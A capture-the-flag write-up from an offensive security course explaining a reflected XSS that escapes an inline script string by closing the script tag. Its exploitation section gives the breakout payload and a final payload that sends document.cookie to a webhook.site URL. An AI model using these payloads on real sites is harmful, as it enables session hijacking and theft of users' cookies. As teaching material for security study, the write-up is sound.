# Scratchpad

**Category:** web / reflected XSS via `<script>` context breakout · **Course:** Offensive Security (PoliTo)

## Vulnerability

User input is embedded directly inside an existing inline `<script>` block as a JS string literal (`const note = "<INPUT>";`) rather than being placed in HTML/attribute context — a different injection context from the other XSS challenges in this lab.

## Exploitation

Progression:

1. Baseline: `const note = "";` — confirms the reflection point and empty-string context.
2. Break out of both the string literal and the enclosing `<script>` tag, then open a fresh one:

   ```html
   </script><script>alert(1)</script>
   ```

   embedded as the note value, so the rendered page becomes:

   ```html
   <script>
   const note = "</script><script>alert(1)</script>";
   </script>
   ```

   The browser's HTML parser closes the original `<script>` block at the first literal `</script>` it sees — regardless of JS string context — letting a brand new, attacker-controlled `<script>` element run.
3. Final exfiltration payload following the same breakout:

   ```html
   </script><script>fetch(`https://webhook.site/...?c=${document.cookie}`)</script>
   ```

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
